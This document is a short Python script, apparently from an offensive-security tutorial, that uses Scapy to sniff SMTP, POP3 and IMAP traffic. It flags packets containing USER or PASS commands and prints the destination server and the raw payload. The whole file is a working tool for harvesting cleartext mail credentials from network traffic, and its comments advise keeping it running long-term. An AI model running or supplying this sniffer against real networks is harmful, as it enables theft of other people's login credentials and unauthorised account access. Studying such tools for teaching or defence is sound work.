#!/usr/bin/env python
#! -*- coding:utf-8 -*-

from scapy.all import *

# Our packet callback
def packet_callback(packet):

        # We check to make sure it has a data payload
        if packet[TCP].payload:
                mail_packet = str(packet[TCP].payload)

                        # We check whether the payload contains the typical USER or PASS mail commands
                        # and if so, print out the actual data bytes of the packet
                if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
                        print("[*] Server: %s" % packet[IP].dst)
                        print("[*] %s" % packet[TCP].payload)

# Let's fire up our sniffer with filters
# We also used a new parameter called store,
# which when set to 0 ensures that Scapy isn’t
# keeping the packets in memory.
# It’s a good idea to use this parameter if you
# intend to leave a long-term sniffer running
# because then you won’t be consuming vast amounts of RAM.
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
